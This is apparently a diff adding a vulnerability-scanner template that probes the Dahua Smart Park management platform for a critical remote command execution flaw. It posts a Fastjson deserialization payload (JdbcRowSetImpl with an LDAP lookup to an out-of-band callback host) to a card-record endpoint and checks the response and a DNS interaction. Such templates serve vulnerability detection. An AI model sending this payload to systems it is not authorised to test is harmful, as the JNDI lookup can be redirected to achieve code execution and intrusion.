@@ -1,0 +1,30 @@
+id: dahua-wpms-rce
+brief:
+    title: Dahua Smart Park Integrated Management Platform - Remote Command Execution
+    by: DhiyaneshDK
+    level: critical
+    about: Dahua Smart Park Integrated Management Platform is vulnerable to RCE.
+    label:
+        - rce
+        - dahua
+        - wpms
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/CardSolution/card/accessControl/swingCardRecord/deleteFtp'
+      head:
+        Content-Type: application/json
+      body: '{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}'
+      signs:
+        - "on": word
+          has:
+            - autoCommit
+            - set property error
+          in: body
+          need: all
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
